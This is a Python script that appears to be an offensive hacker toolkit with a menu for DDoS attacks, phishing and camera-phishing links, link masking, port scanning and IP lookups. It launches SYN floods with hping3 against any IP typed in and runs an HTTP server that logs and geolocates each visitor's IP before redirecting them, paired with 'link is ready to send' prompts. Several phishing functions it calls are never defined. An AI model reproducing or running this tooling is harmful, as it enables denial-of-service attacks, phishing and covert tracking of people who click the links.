#!/usr/bin/env python3
import subprocess
import os
import time
import shutil
import socket
import requests
import json
import ipaddress
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
from colorama import Fore, Style, init
import threading

# Initialize colorama
init()

def clear_console(except_art=False):
    if not except_art:
        os.system('clear')  # Clear the console

def center_text(text):
    # Get terminal width
    terminal_width = shutil.get_terminal_size().columns
    # Split text into lines and center each line
    centered_lines = [line.center(terminal_width) for line in text.strip().split('\n')]
    # Join centered lines with new line characters
    return "\n".join(centered_lines)

def print_centered(text):
    print(center_text(text))

# ASCII Art Logo
logo = Fore.RED+"""
┳┳┓┏┓┏┓┏┓┏┓  ┏┓┓ ┳┏┓┳┓┏┳┓
┃┃┃┏┛┏┛┏┛┃┃  ┃ ┃ ┃┣ ┃┃ ┃ 
  ┛ ┗┗┛┗┛┗┛┗┻  ┗┛┗┛┻┗┛┛┗ ┻ v2
created by mdalam-4986
and iamgeo1
"""

# DDoS Functionality
def ddos_function():
    clear_console()
    ddos_art = """
┳┓┳┓  ┏┓  ┏┓┏┳┓┏┳┓┏┓┏┓┓┏┓
┃┃┃┃┏┓┗┓  ┣┫ ┃  ┃ ┣┫┃ ┃┫ 
┻┛┻┛┗┛┗┛  ┛┗ ┻  ┻ ┛┗┗┛┛┗┛
    """
    print(Fore.GREEN + ddos_art + Style.RESET_ALL)
    target_ip = input(Fore.RED + "Target IP: ")
    duration = int(input(Fore.YELLOW + "Duration in seconds: "))

    print("Starting DDoS attack...")
    end_time = time.time() + duration

    while time.time() < end_time:
        subprocess.run(['hping3', '--flood', '-S', target_ip])
    print("DDoS attack finished.")
    wait_for_user()

# Port Scanner Functionality
def port_scanner():
    clear_console()
    port_scanner_art = """
┏┓┏┓┳┓┏┳┓  ┏┓┏┓┏┓┳┓┳┓┏┓┳┓
┃┃┃┃┣┫ ┃   ┗┓┃ ┣┫┃┃┃┃┣ ┣┫
┣┛┗┛┛┗ ┻   ┗┛┗┛┛┗┛┗┛┗┗┛┛┗

    """
    print(Fore.GREEN + port_scanner_art + Style.RESET_ALL)
    print(Fore.LIGHTGREEN_EX + "Port Scanner" + Style.RESET_ALL)
    
    target_ip = input(Fore.RED + "Target IP: ")
    start_port = int(input(Fore.YELLOW + "Start Port: "))
    end_port = int(input(Fore.YELLOW + "End Port: "))

    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)

        result = sock.connect_ex((target_ip, port))
        
        if result == 0:
            print(f"Port {port} is open")
        else:
            print(f"Port {port} is closed")
        
        sock.close()

    wait_for_user()

# Class to handle IP Toolkit functionality
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    """Custom request handler to log IP and show information."""   
    def do_GET(self):
        parsed_path = urlparse(self.path)
        if parsed_path.path.startswith('/redirect/'):
            user_ip = self.client_address[0]
            print(f"Redirecting {user_ip}...")
            geolocation_info = self.get_geolocation(user_ip)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response_html = f"""
            <html>
                <body>
                    <h1>Your IP: {user_ip}</h1>
                    <h2>Geolocation Information:</h2>
                    <pre>{geolocation_info}</pre>
                    <h3>Redirecting to: {parsed_path.path[10:]}</h3>
                </body>
            </html>
            """
            self.wfile.write(response_html.encode())
            self.send_response(302)
            self.send_header('Location', parsed_path.path[10:])
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def get_geolocation(self, ip):
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private:
                return "Local IP addresses do not have geolocation information."
            else:
                response = requests.get(f"https://ipinfo.io/{ip}/json")
                data = response.json()
                formatted_data = json.dumps(data, indent=4)
                return formatted_data
        except Exception as e:
            return f"Failed to retrieve geolocation information: {str(e)}"

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    httpd.serve_forever()  # Run the server indefinitely

def start_server_thread():
    server_thread = threading.Thread(target=run_server, args=(8000,))
    server_thread.daemon = True  # Allow thread to exit when main program does
    server_thread.start()

# Utility class for the IP Toolkit functionalities
class IPToolkit:
    
    def __init__(self, max_entries=5):
        self.max_entries = max_entries  # Maximum number of entries to keep
        self.latest_info = []  # Circular buffer for latest information

    def add_latest_info(self, info):
        if len(self.latest_info) >= self.max_entries:
            self.latest_info.pop(0)  # Remove oldest entry
        self.latest_info.append(info)  # Add new info

    def get_latest_info(self):
        return "\n".join(self.latest_info) if self.latest_info else "No recent information available."

    def get_local_ip(self):
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        self.add_latest_info(f"Local IP Address: {local_ip}")
        return local_ip

    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json')
            public_ip = response.json()['ip']
            self.add_latest_info(f"Public IP Address: {public_ip}")
            return public_ip
        except Exception as e:
            self.add_latest_info(f"Failed to retrieve public IP: {str(e)}")
            return None

    def ip_geolocation(self, ip):
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private:
                message = "Local IP addresses do not have geolocation information available."
                self.add_latest_info(message)
                return json.dumps({"IP": str(ip_obj), "Message": message}, indent=4)
            else:
                response = requests.get(f"https://ipinfo.io/{ip}/json")
                data = response.json()
                address = data.get('hostname', 'Unknown') + ', ' + data.get('city', 'Unknown') + ', ' + data.get('region', 'Unknown') + ', ' + data.get('country', 'Unknown')
                formatted_data = {
                    "IP": ip,
                    "Hostname": data.get('hostname', 'N/A'),
                    "City": data.get('city', 'N/A'),
                    "Region": data.get('region', 'N/A'),
                    "Country": data.get('country', 'N/A'),
                    "Location": data.get('loc', 'N/A'),
                    "Postal": data.get('postal', 'N/A'),
                    "Address": address
                }
                self.add_latest_info(f"Geolocation Information for {ip}: {formatted_data}")
                return json.dumps(formatted_data, indent=4)
        except Exception as e:
            message = f"Failed to retrieve geolocation information: {str(e)}"
            self.add_latest_info(message)
            return message

    def ip_info(self, ip):
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/")
            if response.status_code == 200:
                data = response.json()
                self.add_latest_info(f"IP Information for {ip}: {data}")
                return data
            else:
                self.add_latest_info(f"Failed to retrieve information for {ip}: {response.status_code}")
                return f"Failed to retrieve information: {response.status_code}"
        except Exception as e:
            self.add_latest_info(f"Error: {str(e)}")
            return f"Error: {str(e)}"

    def generate_ngrok_link(self):
        # Placeholder for generating ngrok link
        return "Ngrok link generated (placeholder)."

    def generate_serveo_link(self):
        # Placeholder for generating serveo link
        return "Serveo link generated (placeholder)."

def wait_for_user():
    input(Fore.YELLOW + "Press Enter to continue...")

def run_my_program():
    clear_console()
    print(Fore.CYAN + logo + Style.RESET_ALL)
    toolkit = IPToolkit()

    # Start the HTTP server thread
    start_server_thread()

    while True:
        print(Fore.MAGENTA + "\n====================")
        print(Fore.LIGHTCYAN_EX + " Welcome to the IP Toolkit ")
        print(Fore.MAGENTA + "====================")
        print(Fore.BLUE + "1. Get Local IP Address")
        print(Fore.BLUE + "2. Get Public IP Address")
        print(Fore.BLUE + "3. IP Geolocation")
        print(Fore.BLUE + "4. IP Information")
        print(Fore.BLUE + "5. Generate Tunnel Link")
        print(Fore.BLUE + "6. View Latest Information")
        print(Fore.BLUE + "7. Exit")
        choice = input(Fore.YELLOW + "\nEnter your choice (1-7): ")

        if choice == '1':
            local_ip = toolkit.get_local_ip()
            print(Fore.GREEN + f"Local IP Address: {local_ip}\n")
        elif choice == '2':
            public_ip = toolkit.get_public_ip()
            print(Fore.GREEN + f"Public IP Address: {public_ip}\n")
        elif choice == '3':
            ip = input(Fore.YELLOW + "Enter the IP address for geolocation (e.g., 8.8.8.8): ")
            print(Fore.GREEN + f"Geolocation Information:\n{toolkit.ip_geolocation(ip)}\n")
        elif choice == '4':
            ip = input(Fore.YELLOW + "Enter the IP address for information (e.g., 8.8.8.8): ")
            ip_information = toolkit.ip_info(ip)
            if isinstance(ip_information, dict):
                formatted_info = "\n".join([f"{key}: {value}" for key, value in ip_information.items()])
                print(Fore.GREEN + f"IP Information:\n{formatted_info}\n")
            else:
                print(Fore.RED + f"Error: {ip_information}\n")
        elif choice == '5':
            tunnel_choice = input(Fore.YELLOW + "Choose a tunnel service:\n1. Ngrok\n2. Serveo\nEnter your choice (1-2): ")
            if tunnel_choice == '1':
                ngrok_message = toolkit.generate_ngrok_link()
                print(Fore.GREEN + ngrok_message)
                input(Fore.YELLOW + "Link is ready to send! Press Enter to return to the main menu.")
            elif tunnel_choice == '2':
                serveo_message = toolkit.generate_serveo_link()
                print(Fore.GREEN + serveo_message)
                input(Fore.YELLOW + "Link is ready to send! Press Enter to return to the main menu.")
            else:
                print(Fore.RED + "Invalid choice for tunnel service. Returning to main menu.\n")
        elif choice == '6':
            print(Fore.GREEN + f"Latest Information:\n{toolkit.get_latest_info()}\n")
        elif choice == '7':
            print(Fore.RED + "Exiting IP Toolkit. Goodbye!\n")
            break
        else:
            print(Fore.RED + "Invalid choice, please try again.\n")

def main_menu():
    while True:
        clear_console()
        logo_centered = center_text(logo)
        print(logo_centered)  # Print the centered logo

        # Hardcoded ASCII art and menu options
        menu_text = """
Select an option to start:
1. DDoS Attack
2. Link Masker (MaskPhish)
3. Phishing Links (ZPhisher)
4. Cam Links (CamPhish)
5. Port Scanner
6. Geo Multitool
7. IP Toolkit
00. Exit
"""
        print(center_text(Fore.RED + menu_text))  # Print the centered menu
        choice = input().strip()
        
        if choice == '1':
            ddos_function()
        elif choice == '2':
            run_maskphish()  # Assuming run_maskphish is defined elsewhere
        elif choice == '3':
            run_phishing_links()  # Assuming run_phishing_links is defined elsewhere
        elif choice == '4':
            run_cam_links()  # Assuming run_cam_links is defined elsewhere
        elif choice == '5':
            port_scanner()
        elif choice == '6':
            geo_multitool()  # Assuming geo_multitool is defined elsewhere
        elif choice == '7':
            run_my_program()  # Call your new program here
        elif choice == '00':
            print("Exiting the application.")
            break  # Exit the application
        else:
            print("Invalid choice, please select a valid option.")

if __name__ == "__main__":
    main_menu()
